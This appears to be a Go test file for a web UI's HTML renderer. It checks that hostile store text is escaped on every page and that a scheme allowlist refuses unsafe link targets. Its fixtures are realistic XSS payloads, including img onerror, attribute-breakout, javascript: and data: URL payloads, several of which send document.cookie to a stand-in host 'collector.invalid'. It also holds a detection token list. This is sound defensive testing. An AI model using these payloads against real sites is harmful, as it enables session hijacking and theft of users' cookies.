package ui

import (
	"strings"
	"testing"

	g "maragu.dev/gomponents"

	"github.com/ZacxDev/cairn/internal/report"
	"github.com/ZacxDev/cairn/internal/store"
)

// 🔴 THE HOSTILE FIXTURES ARE REALISTIC, NOT TEXTBOOK, AND THAT IS THE POINT RATHER
// THAN FLAVOUR. This repository records that a scanner allowlists its own canonical
// examples and then scans clean — the same failure applies to an escaping test whose
// only input is `<script>alert(1)</script>`, because that string is what every
// escaper's own test suite already covers and it exercises exactly one context. Each
// string below breaks out of a DIFFERENT position and does something a real attacker
// would want: exfiltrate a session, overlay the page, or turn a ref into a
// script-scheme link.
//
// 🔴 AND THEY ARE SYNTHETIC. This repository is public and was extracted from a
// private one; `collector.invalid` is in the IANA-reserved `.invalid` TLD and
// resolves nowhere, and no scope, project or host name below belongs to anybody.
const (
	// A breakout from TEXT CONTENT that closes the enclosing element and appends an
	// image whose error handler exfiltrates the document's cookies.
	hostileTitle = `Rollout notes</span><img src=x onerror="fetch('//collector.invalid/c?'+document.cookie)">`

	// A breakout from an ATTRIBUTE VALUE: it closes the quoted value and adds an
	// event handler on the same element, which needs no new tag at all.
	hostileRef = `runbook" onmouseover="fetch('//collector.invalid/c?'+document.cookie)" data-x="`

	// An UNCLOSED tag, which is the shape that swallows the rest of the document
	// into an attribute value and is invisible to a guard looking for a matched
	// `<script>...</script>` pair. The payload is a full-viewport overlay.
	hostileAlias = `<div style="position:fixed;inset:0;z-index:2147483647;background:#fff" onclick="`

	// A script-scheme URL in an HREF POSITION. `<system>:<id>` is the documented
	// shape of a task ref, so a scheme followed by an opaque part is a WELL-FORMED
	// ref — this is reachable input, not a constructed one. `template.HTMLEscapeString`
	// has nothing to say about it: every character survives escaping intact.
	hostileTaskScript = `javascript:fetch('//collector.invalid/c?'+document.cookie)`

	// The same attack with the scheme's case varied and a leading tab. RFC 3986 §3.1
	// makes a scheme case-insensitive and the HTML specification strips leading ASCII
	// whitespace from a URL attribute before resolving it, so a browser reaches the
	// identical handler a bare `javascript:` reaches.
	//
	// ⚠ IT IS NOT WHAT PROVES `safeHref`'s CASE-FOLDING LOAD-BEARING, AND AN EARLIER
	// DRAFT OF THIS COMMENT SAID IT WAS. Measured with a mutant that deletes the
	// `ToLower`: this fixture is still refused, because an ALLOWLIST rejects every
	// casing of a scheme that is not on it. The fold's measured effect is on the
	// PERMIT side — `HTTPS://tracker.invalid/…` starts being refused. This fixture
	// earns its place for a different reason: it is what a real payload looks like
	// against a DENYLIST, which is the design this one must not drift into.
	hostileTaskMixedCase = "\t JaVaScRiPt:void(document.title=document.cookie)"

	// A `data:` URL carrying a whole HTML document, which is a same-tab navigation
	// to attacker-authored markup.
	hostileTaskData = `data:text/html;base64,PHNjcmlwdD5mZXRjaCgnLy9jb2xsZWN0b3IuaW52YWxpZC8nKTwvc2NyaXB0Pg==`

	// A scope NAME, because the heading is user text too.
	hostileScope = `platform</h2><script src="//collector.invalid/x.js"></script><h2>`
)

// dangerousTokens are substrings that CANNOT appear in a legitimately-rendered page,
// because this renderer emits no `img` element, no `script` element and no href
// outside [allowedSchemes].
//
// 🔴 THE LIST IS SHORT ON PURPOSE, AND THE FIRST DRAFT'S LONGER ONE WAS WRONG RATHER
// THAN MERELY NOISY. It also held `onerror=`, `onmouseover=`, `</span>` and `</h2>`,
// and every one of those fired on a page that was CORRECTLY escaped: `</span>` and
// `</h2>` are this page's own structure, and `onerror=&#34;…` is the ESCAPED,
// inert rendition of the payload — the `=` is not an escapable character, so a
// substring test on `onerror=` cannot tell live markup from escaped text. A guard
// that fires on a safe page is a guard that gets deleted, and the structural
// comparison below is what actually answers the question those tokens were reaching
// for.
var dangerousTokens = []string{
	"<img",
	"<script",
	`href="javascript:`,
	`href="data:`,
}

func countTokens(s string) int {
	n := 0
	lower := strings.ToLower(s)
	for _, tok := range dangerousTokens {
		n += strings.Count(lower, strings.ToLower(tok))
	}
	return n
}

// structure is the markup-shape of a rendered page: how many tags it opens and
// closes, and how many quoted attribute values it carries.
//
// 🔴 THIS IS THE ASSERTION THAT ACTUALLY ANSWERS "DID ANY USER TEXT BECOME MARKUP",
// AND IT IS A DIFFERENTIAL RATHER THAN A PATTERN. Escaping's whole claim is that the
// page's SHAPE does not depend on its CONTENT — so rendering one world with benign
// content and an identically-shaped world with hostile content must produce the same
// counts. An injected tag moves `lt`/`gt`; an injected attribute moves `eqQuote`.
// Nothing here needs a list of attack strings, which is what makes it blind to
// nothing a future payload invents.
type structure struct{ lt, gt, eqQuote int }

func structureOf(s string) structure {
	return structure{
		lt:      strings.Count(s, "<"),
		gt:      strings.Count(s, ">"),
		eqQuote: strings.Count(s, `="`),
	}
}

// A hostile SECTION HEADING and a hostile BULLET. Both are new surfaces: until the
// entry page existed, an entry's BODY never reached a browser at all — only its ref,
// title, aliases and task refs did.
//
// 🔴 THE BULLET IS THE WIDEST USER-TEXT SINK ON THE SURFACE AND ITS PAYLOAD IS CHOSEN
// FOR THE POSITION IT LANDS IN. It renders inside a `<pre><code>` as text content AND
// its first line decides a badge, so the fixture carries a markup breakout and a
// near-miss marker in the same line: a renderer that keyed the badge on a substring
// rather than on `store.OpennessPopulation` would light the OPEN badge for it.
const (
	hostileHeading = `## Pointers</h3><img src=x onerror="fetch('//collector.invalid/c?'+document.cookie)"><h3>`
	hostileBullet  = `- OPENISH: </code></pre><img src=x onerror="fetch('//collector.invalid/c')"> see the runbook`
	hostileBody    = `prose</code></pre><script src="//collector.invalid/x.js"></script><pre><code>`
)

// benignWorld mirrors [hostileWorld] SHAPE FOR SHAPE: one scope, one entry, one
// alias, four task refs of which exactly three are refused by [safeHref] and one is
// a link, two sections, one bullet and one malformed row. A benign world of a different
// shape would produce different counts for a reason that has nothing to do with
// escaping, and the comparison would be noise.
func benignWorld() []Scope {
	return []Scope{{
		ID:   fixtureScope,
		Name: "platform",
		Entries: []Entry{{
			Ref:      "runbook",
			Title:    "Rollout notes",
			Filename: "runbook.md",
			Aliases:  []string{"rollout"},
			Tasks: []string{
				"jira:PLAT-1",
				"jira:PLAT-2",
				"jira:PLAT-3",
				"https://tracker.invalid/issue/4711",
			},
			Sections: []Section{
				{Heading: "## Pointers", Body: "prose"},
				{Heading: store.NuanceHeading, Body: "- a bullet", Bullets: []Bullet{
					{Lines: []string{"- a bullet"}, Date: "2000-06-01", Population: store.PopulationNone},
				}},
			},
			BulletCount: 1,
		}},
		Malformed: []Malformed{{Label: "platform/broken.md", Reason: "missing `service:`"}},
	}}
}

func hostileWorld() []Scope {
	return []Scope{{
		// The ID is NOT hostile: it is minted by `control.DerivedID` over a URL-safe
		// alphabet and can never be anything else, so a hostile one would be testing a
		// value the type cannot hold. Same id as the benign world so the two pages carry
		// the same links and the structural differential stays about content.
		ID:   fixtureScope,
		Name: hostileScope,
		Entries: []Entry{{
			Ref:      hostileRef,
			Title:    hostileTitle,
			Filename: hostileRef + ".md",
			Aliases:  []string{hostileAlias},
			Tasks: []string{
				hostileTaskScript,
				hostileTaskMixedCase,
				hostileTaskData,
				// One BENIGN ref, so the page's link rendering is exercised too. A
				// page on which every ref is refused would pass a "no href=javascript"
				// assertion by never emitting an href at all.
				"https://tracker.invalid/issue/4711",
			},
			Sections: []Section{
				{Heading: hostileHeading, Body: hostileBody},
				{Heading: store.NuanceHeading, Body: hostileBullet, Bullets: []Bullet{
					// 🔴 `PopulationNone`, WITH AN `OPENISH:` FIRST LINE. The badge is
					// derived from this field and never from the text, so a renderer
					// that read the words would light the OPEN badge here and the
					// structural differential below would see the extra element.
					{Lines: []string{hostileBullet}, Date: "2000-06-01", Population: store.PopulationNone},
				}},
			},
			BulletCount: 1,
		}},
		Malformed: []Malformed{{Label: hostileRef + "/broken.md", Reason: hostileBody}},
	}}
}

// renderCSRF is a FIXED token, and the same one for the hostile and the benign world.
//
// 🔴 THE STRUCTURAL DIFFERENTIAL BELOW IS A COUNT OF `<`, `>` AND `="`, SO ANYTHING THAT
// RENDERS IN ONE WORLD AND NOT THE OTHER BREAKS IT FOR THE WRONG REASON. The sign-out
// form renders only when a token is present, so passing one here — the same one to both
// — keeps the two pages the same SHAPE while bringing the form inside the escaping
// assertions rather than leaving a new markup sink outside them.
const renderCSRF = "a-fixed-fixture-csrf-token"

func viewOf(viewer string, scopes []Scope) PageView {
	return PageView{Viewer: viewer, CSRF: renderCSRF, Scopes: scopes}
}

func render(t *testing.T, viewer string, scopes []Scope) string {
	t.Helper()
	return renderNode(t, Page(viewOf(viewer, scopes)))
}

func renderNode(t *testing.T, node g.Node) string {
	t.Helper()
	var b strings.Builder
	if err := node.Render(&b); err != nil {
		t.Fatalf("the page did not render: %v", err)
	}
	return b.String()
}

// renderedPages is the SAME page, rendered over two worlds of identical shape, for each
// of the three browse pages.
//
// 🔴 ALL THREE, BECAUSE THE DIFFERENTIAL IS PER PAGE AND THE ENTRY PAGE IS THE ONE THAT
// MATTERS. The root page shows no entry body at all; the scope page shows refs and
// titles; only the entry page renders sections and bullets, which is the surface this
// change ADDED and the only one where a store file's prose reaches the browser. A guard
// that ran over the root alone would be green for a broken entry page.
func renderedPages(t *testing.T, world []Scope) map[string]string {
	t.Helper()
	v := viewOf("operator@example.invalid", world)
	scopeView := v
	scopeView.Scope = &world[0]
	entryView := scopeView
	entryView.Entry = &world[0].Entries[0]
	searchView := v
	searchView.Query = world[0].Entries[0].Ref
	searchView.Results = &SearchResults{
		Query:          world[0].Entries[0].Ref,
		TotalHits:      1,
		ScopesSearched: []string{world[0].Name},
		Hits: []Hit{{
			ScopeID: world[0].ID,
			Scope:   world[0].Name,
			Ref:     world[0].Entries[0].Ref,
			Section: world[0].Entries[0].Sections[0].Heading,
			Start:   1,
			Lines:   world[0].Entries[0].Sections[1].Bullets[0].Lines,
			Score:   1,
			Basis:   report.BasisLine,
		}},
	}
	return map[string]string{
		"root":     renderNode(t, Page(v)),
		"navigate": renderNode(t, NavigatePage(v)),
		"scope":    renderNode(t, ScopePage(scopeView)),
		"entry":    renderNode(t, EntryPage(entryView)),
		"search":   renderNode(t, Page(searchView)),
	}
}

// TestHostileEntryTextIsEscapedOnEveryBrowsePage is the XSS guard over the pages this
// change added, and it is the SAME differential `TestHostileEntryTextIsEscaped` runs over
// the root — applied per page, because each renders a different subset of the store.
func TestHostileEntryTextIsEscapedOnEveryBrowsePage(t *testing.T) {
	// POSITIVE CONTROL — the new fixtures really do carry markup the counters can see.
	// Reported as a pair with the zeroes below, never on their own.
	newlyReachable := hostileHeading + hostileBullet + hostileBody
	if n := countTokens(newlyReachable); n == 0 {
		t.Fatal("POSITIVE CONTROL FAILED: the heading/bullet/body fixtures carry NOTHING the token scanner " +
			"recognises, so a zero on the rendered entry page below would mean nothing")
	}
	benignSectionContent := "## Pointers" + "prose" + "- a bullet"
	if structureOf(benignSectionContent) == structureOf(newlyReachable) {
		t.Fatalf("POSITIVE CONTROL FAILED: the hostile section fixtures carry the same markup shape as the "+
			"benign ones (%+v), so the differential below cannot detect an injection into a section or a "+
			"bullet and its agreement would mean nothing", structureOf(newlyReachable))
	}

	hostile := renderedPages(t, hostileWorld())
	benign := renderedPages(t, benignWorld())
	if len(hostile) != len(benign) || len(hostile) == 0 {
		t.Fatalf("the two renders produced %d and %d pages; the comparison below needs the same set",
			len(hostile), len(benign))
	}

	checked := 0
	for name, got := range hostile {
		want := benign[name]
		if want == "" {
			t.Fatalf("no benign render for page %q, so its comparison is vacuous", name)
		}
		checked++
		if gotStructure, wantStructure := structureOf(got), structureOf(want); gotStructure != wantStructure {
			t.Errorf("the %s page's MARKUP SHAPE differs between the hostile and benign worlds: got %+v, "+
				"want %+v.\nThe two worlds have the same number of scopes, entries, aliases, refs, sections, "+
				"bullets and malformed rows, so every difference here is user text that became markup. "+
				"gomponents escapes text and attribute VALUES; it does not neutralise a URL scheme and it "+
				"writes an element or attribute NAME verbatim.", name, gotStructure, wantStructure)
		}
		for _, tok := range dangerousTokens {
			if n := strings.Count(strings.ToLower(got), strings.ToLower(tok)); n > 0 {
				t.Errorf("the %s page carries %d occurrence(s) of %q, which this renderer never emits: "+
					"it came out of store content.", name, n, tok)
			}
		}
	}
	if checked == 0 {
		t.Fatal("NO page was compared, so this test measured nothing")
	}

	// 🔴 AND THE WHOLE ESCAPED STRING, PINNED, FOR EACH OF THE THREE NEW SINKS. A guard
	// on the ABSENCE of a token passes for a page that dropped the content entirely; this
	// is what says the text is present AND inert. The literals are hand-written from the
	// HTML escaping rules rather than derived from the function under test.
	entry := hostile["entry"]
	for _, want := range []string{
		escapeForTest(hostileHeading),
		escapeForTest(hostileBullet),
		escapeForTest(hostileBody),
	} {
		if !strings.Contains(entry, want) {
			t.Errorf("the entry page does not carry the fully escaped form of a hostile string; it was "+
				"DROPPED rather than rendered inert.\nwanted substring: %s", want)
		}
	}
	t.Logf("escaping: %d page(s) compared structurally over hostile vs benign worlds; %d dangerous token(s) "+
		"in the new section/bullet fixtures, 0 in any rendered page", checked, countTokens(newlyReachable))
}

// TestTheBadgeComesFromThePopulationAndNotFromTheWords is the REGRESSION test for the
// distinction `store.JournalBullet.OpennessPopulation` exists to make.
//
// 🔴 A NEAR MISS IS A BULLET THAT TRIED TO WRITE A MARKER AND MISSED THE GRAMMAR, AND IT
// MUST NOT SHOW THE OPEN BADGE. `report.RecalledEntry.NearMissCount`'s own comment records
// that until near misses were counted separately they were byte-identical to "no marker"
// on the read surface — the badge simply did not render, and a vanishing badge looks like
// success. So this pins both directions: the open badge appears for `PopulationOpen` and
// for nothing else, and a near miss gets its OWN badge rather than silence.
//
// ⚠ IT DRIVES THE PARSER RATHER THAN HAND-BUILDING THE POPULATIONS, so it also measures
// that the near-miss fixture really IS a near miss to `store` — a hand-set
// `Population: PopulationNearMiss` would assert the renderer against a value this test
// invented.
func TestTheBadgeComesFromThePopulationAndNotFromTheWords(t *testing.T) {
	body := strings.Join([]string{
		"- OPEN: the declared one",
		"- OPEN the near miss, no colon",
		"- an ordinary bullet",
	}, "\n")
	parsed := store.ParseJournalBullets(body)
	if len(parsed) != 3 {
		t.Fatalf("the fixture parsed to %d bullets, want 3; the assertions below would be about the wrong lines", len(parsed))
	}

	// INSTRUMENT CONTROL: the three lines really are in three different populations, so
	// the render comparison below is about the renderer and not about a fixture whose
	// lines all mean the same thing.
	wantPopulations := []string{store.PopulationOpen, store.PopulationNearMiss, store.PopulationNone}
	var section Section
	section.Heading = store.NuanceHeading
	section.Body = body
	for i, b := range parsed {
		if got := b.OpennessPopulation(); got != wantPopulations[i] {
			t.Fatalf("bullet %d parsed as population %q, want %q. The fixture is not exercising the "+
				"distinction this test is named for.", i, got, wantPopulations[i])
		}
		section.Bullets = append(section.Bullets, Bullet{Lines: b.Lines, Date: b.Date, Population: b.OpennessPopulation()})
	}

	world := benignWorld()
	world[0].Entries[0].Sections = []Section{section}
	view := viewOf("operator@example.invalid", world)
	view.Scope = &world[0]
	view.Entry = &world[0].Entries[0]
	out := renderNode(t, EntryPage(view))

	openBadges := strings.Count(out, `<span class="badge badge-open">OPEN</span>`)
	nearBadges := strings.Count(out, `<span class="badge badge-near">near-miss marker</span>`)
	if openBadges != 1 {
		t.Errorf("the entry page rendered %d OPEN badge(s) over a section with exactly ONE declared `OPEN:` "+
			"bullet, one near miss and one plain line. A renderer keyed on the WORD would light two.", openBadges)
	}
	if nearBadges != 1 {
		t.Errorf("the entry page rendered %d near-miss badge(s), want 1. A near miss rendered as nothing is "+
			"byte-identical to a bullet with no marker, which is the state that hides a stale open action.",
			nearBadges)
	}
	// The near-miss line's own text must still be on the page: the badge is the claim, the
	// line is the evidence, and a page that showed one without the other is unreadable.
	if !strings.Contains(out, escapeForTest("OPEN the near miss, no colon")) {
		t.Error("the near-miss bullet's text is not on the page, so its badge names a line nobody can read")
	}
	t.Logf("badges: %d open, %d near-miss over populations %v", openBadges, nearBadges, wantPopulations)
}

// TestAMalformedEntryRendersAsMalformed pins that a file the loader REFUSED is on the
// page rather than absent.
//
// 🔴 A BROWSER THAT DROPS THEM DISAGREES WITH THE CLI WHILE LOOKING COMPLETE, which is
// why this is a regression test and not a nicety. `store.LoadStore` loads with `Collect`
// because failing closed cost a whole scope over one bad file, and `internal/report`
// renders every collected row; a page that showed only the good entries would be a
// shorter, WRONG store with no symptom.
func TestAMalformedEntryRendersAsMalformed(t *testing.T) {
	world := benignWorld()
	if len(world[0].Malformed) == 0 {
		t.Fatal("the benign fixture carries no malformed row, so this test would pass vacuously")
	}
	row := world[0].Malformed[0]

	view := viewOf("operator@example.invalid", world)
	view.Scope = &world[0]
	out := renderNode(t, ScopePage(view))

	if !strings.Contains(out, escapeForTest(row.Label)) {
		t.Errorf("the scope page does not name the malformed file %q. A page that drops it shows a complete-"+
			"looking scope that is missing entries.", row.Label)
	}
	if !strings.Contains(out, escapeForTest(row.Reason)) {
		t.Errorf("the scope page names %q without the loader's reason, so a reader cannot tell a broken file "+
			"from one they are not allowed to see", row.Label)
	}

	// NEGATIVE CONTROL: a scope with no malformed rows renders no block, so the assertion
	// above is about the rows and not about a heading that is always there.
	clean := benignWorld()
	clean[0].Malformed = nil
	cleanView := viewOf("operator@example.invalid", clean)
	cleanView.Scope = &clean[0]
	if cleanOut := renderNode(t, ScopePage(cleanView)); strings.Contains(cleanOut, "Unreadable entry files") {
		t.Error("a scope with NO malformed rows still rendered the unreadable-files block, so its presence " +
			"above says nothing about whether the rows reached the page")
	}
	t.Logf("malformed: %q rendered with its reason; a clean scope renders no block", row.Label)
}

// renderScopeOf is the SCOPE page over a one-scope world — the page that renders an
// entry's ref, title, aliases and task refs.
//
// ⚠ IT WAS THE ROOT PAGE AND IT MOVED, WHICH IS A CONSEQUENCE OF THE INFORMATION
// ARCHITECTURE RATHER THAN A WEAKENING. The root used to render every entry of every
// scope inline; it now renders a CARD per scope, listing refs and no titles, aliases or
// task refs at all. The assertions below are about those four fields, so they follow them
// to the page that shows them. The root's own escaping is not left unmeasured —
// `TestHostileEntryTextIsEscapedOnEveryBrowsePage` runs the structural differential over
// all five renders including the root.
func renderScopeOf(t *testing.T, viewer string, scopes []Scope) string {
	t.Helper()
	v := viewOf(viewer, scopes)
	v.Scope = &scopes[0]
	return renderNode(t, ScopePage(v))
}

// TestHostileEntryTextIsEscaped is the XSS guard.
func TestHostileEntryTextIsEscaped(t *testing.T) {
	// POSITIVE CONTROL 1 — the token scanner can see the thing. Reported as a pair
	// with the zero below, never on its own.
	raw := hostileScope + hostileRef + hostileTitle + hostileAlias +
		`href="` + hostileTaskScript + `"` + `href="` + hostileTaskData + `"`
	inInput := countTokens(raw)
	if inInput == 0 {
		t.Fatal("POSITIVE CONTROL FAILED: the token scanner found NOTHING dangerous in the raw hostile fixtures, " +
			"so its zero on the rendered page below would mean nothing. Either dangerousTokens no longer matches " +
			"the fixtures or the fixtures were softened.")
	}

	// POSITIVE CONTROL 2 — the STRUCTURE counter can see an injection. If these
	// strings reached the page unescaped the counts below would move, and this is the
	// measurement that says so rather than an assumption that they would.
	benignContent := "platform" + "runbook" + "Rollout notes" + "rollout"
	hostileContent := hostileScope + hostileRef + hostileTitle + hostileAlias
	if structureOf(benignContent) == structureOf(hostileContent) {
		t.Fatalf("POSITIVE CONTROL FAILED: the hostile fixtures carry the same markup shape as the benign ones "+
			"(%+v), so the differential below cannot detect an injection and its agreement would mean nothing.",
			structureOf(benignContent))
	}

	out := renderScopeOf(t, "operator@example.invalid", hostileWorld())
	benignOut := renderScopeOf(t, "operator@example.invalid", benignWorld())

	// 🔴 THE DIFFERENTIAL. Same shape, different content, identical markup structure.
	gotStructure, wantStructure := structureOf(out), structureOf(benignOut)
	if gotStructure != wantStructure {
		t.Errorf("the hostile page's MARKUP SHAPE differs from the benign page's: got %+v, want %+v.\n"+
			"The two worlds have the same number of scopes, entries, aliases and refused/permitted refs, so every "+
			"difference here is user text that became markup. gomponents escapes text and attribute VALUES; it "+
			"does not neutralise a URL scheme and it writes an element or attribute NAME verbatim — check which "+
			"of those the new code reached for.", gotStructure, wantStructure)
	}

	inOutput := countTokens(out)
	t.Logf("dangerous tokens: %d in the raw fixtures, %d in the rendered page; structure hostile=%+v benign=%+v",
		inInput, inOutput, gotStructure, wantStructure)
	if inOutput != 0 {
		for _, tok := range dangerousTokens {
			if n := strings.Count(strings.ToLower(out), strings.ToLower(tok)); n > 0 {
				t.Errorf("the rendered page carries %d occurrence(s) of %q, which this renderer never emits: "+
					"it came out of store content.", n, tok)
			}
		}
	}

	// 🔴 PIN THE WHOLE ESCAPED STRING, NOT THE ABSENCE OF A WORD. A guard on words is
	// walkable by rewording; these literals are hand-written from the HTML escaping
	// rules rather than derived from the function under test, so a change in what the
	// renderer escapes fails here rather than silently agreeing with itself.
	wantEscaped := []string{
		`Rollout notes&lt;/span&gt;&lt;img src=x onerror=&#34;fetch(&#39;//collector.invalid/c?&#39;+document.cookie)&#34;&gt;`,
		`runbook&#34; onmouseover=&#34;fetch(&#39;//collector.invalid/c?&#39;+document.cookie)&#34; data-x=&#34;`,
		`&lt;div style=&#34;position:fixed;inset:0;z-index:2147483647;background:#fff&#34; onclick=&#34;`,
		`platform&lt;/h2&gt;&lt;script src=&#34;//collector.invalid/x.js&#34;&gt;&lt;/script&gt;&lt;h2&gt;`,
	}
	for _, want := range wantEscaped {
		if !strings.Contains(out, want) {
			t.Errorf("the rendered page does not carry the fully escaped form of a hostile string.\nwanted substring: %s", want)
		}
	}

	// The refused refs are VISIBLE and INERT — present as text, absent as links.
	for _, refused := range []string{hostileTaskScript, hostileTaskMixedCase, hostileTaskData} {
		trimmed := strings.TrimSpace(refused)
		if !strings.Contains(out, escapeForTest(trimmed)) {
			t.Errorf("a refused task ref was DROPPED rather than rendered as text: %q. "+
				"Dropping hides a fact the file carries; the page must show it and not link it.", refused)
		}
		if strings.Contains(strings.ToLower(out), `href="`+strings.ToLower(trimmed)) {
			t.Errorf("a refused task ref reached an href: %q", refused)
		}
	}

	// The benign ref IS a link, so the refusals above are not "no link is ever made".
	if !strings.Contains(out, `<a href="https://tracker.invalid/issue/4711">`) {
		t.Error("the benign https ref did not render as a link, so every `no href=javascript` assertion above " +
			"is satisfied by a page with no links at all")
	}
}

// escapeForTest is the hand-written escaping the assertions above compare against —
// deliberately NOT `template.HTMLEscapeString`, so the expectation is not derived
// from the same function the renderer uses.
func escapeForTest(s string) string {
	r := strings.NewReplacer(
		"&", "&amp;",
		"<", "&lt;",
		">", "&gt;",
		`"`, "&#34;",
		"'", "&#39;",
	)
	return r.Replace(s)
}

// TestSafeHrefAllowlistsSchemes measures [safeHref] directly, at more than one point
// on every dimension it branches on.
func TestSafeHrefAllowlistsSchemes(t *testing.T) {
	permitted := []string{
		"https://tracker.invalid/issue/1",
		"http://tracker.invalid/issue/1",
		"HTTPS://tracker.invalid/issue/1",
		"  https://tracker.invalid/issue/1  ",
	}
	refused := []string{
		hostileTaskScript,
		hostileTaskMixedCase,
		hostileTaskData,
		"",
		"   ",
		"jira:PLAT-14",             // an ordinary task ref, which is NOT a URL
		"/entries",                 // same-origin: refused on purpose, see allowedSchemes
		"//collector.invalid/x",    // protocol-relative
		"vbscript:msgbox(1)",       //
		"httpsx://tracker.invalid", // a scheme that merely starts with a permitted one
		"https:/tracker.invalid",   // one slash: not the `https://` prefix
	}
	for _, in := range permitted {
		got, ok := safeHref(in)
		if !ok {
			t.Errorf("safeHref refused a permitted URL %q", in)
			continue
		}
		if strings.TrimSpace(in) != got {
			t.Errorf("safeHref(%q) returned %q; it must return the stripped input unchanged", in, got)
		}
	}
	for _, in := range refused {
		if got, ok := safeHref(in); ok {
			t.Errorf("safeHref PERMITTED %q (returned %q). Every entry in this list is either not a URL at all "+
				"or a scheme a browser will act on, and permitting one puts it in an href built from store content.",
				in, got)
		}
	}
	t.Logf("safeHref: %d permitted, %d refused", len(permitted), len(refused))
}

// TestAnEmptyWorldRendersAnAuthorityAnswer pins that "nothing visible" is stated
// rather than rendered as a blank page — an empty result cannot distinguish an empty
// store from a credential with no scopes, and the page must not imply the first.
func TestAnEmptyWorldRendersAnAuthorityAnswer(t *testing.T) {
	out := render(t, "operator@example.invalid", nil)
	if !strings.Contains(out, "No scope is visible to this credential") {
		t.Error("an empty world rendered no explanation, so a reader cannot tell an empty store from a narrow credential")
	}
	if !strings.Contains(out, "operator@example.invalid") {
		t.Error("the viewer's display name is missing from the page")
	}
}
